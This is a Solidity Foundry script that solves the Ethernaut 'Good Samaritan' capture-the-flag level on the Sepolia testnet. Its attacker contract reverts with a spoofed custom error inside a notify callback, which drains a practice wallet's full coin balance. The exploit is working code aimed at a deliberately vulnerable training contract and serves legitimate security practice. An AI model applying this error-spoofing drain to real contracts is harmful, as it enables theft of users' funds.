// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";

interface GoodSamaritan {
    function coin() external returns(Coin coin);
    function wallet() external returns(Wallet wallet);
    function requestDonation() external returns(bool enoughBalance);
}

interface Wallet{
    function owner() external returns(address);
    function coin() external returns(address);
}

interface Coin{
    function balances(address) external view returns(uint256);
}


contract Attacker {
    error NotEnoughBalance();
    GoodSamaritan instance;
    constructor(address _instance) {
        instance = GoodSamaritan(_instance);
    }
    function isContract(address addr) public returns (bool) {
        uint balance = instance.coin().balances(address(instance.wallet()));
        if(balance > 0){
            return true;
        }
        return false;
    }

    function notify(uint256 amount) external {
        uint balance = instance.coin().balances(address(instance.wallet()));
        if (balance > 0){
            revert NotEnoughBalance();
        }
    }

    function attack() external {
        instance.requestDonation();
    }
}

interface Ethernaut{
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
    function statistics() external view returns (address);
}


contract EtherNautScript is Script {
    Ethernaut naut = Ethernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);

    function setUp() public{
        vm.createSelectFork("sepolia");
    }

    function submitLevelInstance(address instance) internal{
        naut.submitLevelInstance(instance);
    }

    function createLevelInstance(address level) internal{
        naut.createLevelInstance(level);
    }

    function run() external{
        vm.startBroadcast();

        address instance = 0xF10B81b6a2051B1a002b94C88F9995e13407e09B;
        Coin coin = GoodSamaritan(instance).coin();
        Wallet wallet = GoodSamaritan(instance).wallet();

        require(coin.balances(address(wallet)) >0, "Wallet should still have balance");

        Attacker attacker = new Attacker(instance);
        attacker.attack();

        require(0 == coin.balances(address(wallet)), "Wallet drained");

        naut.submitLevelInstance(instance);
        vm.stopBroadcast();
    }
}
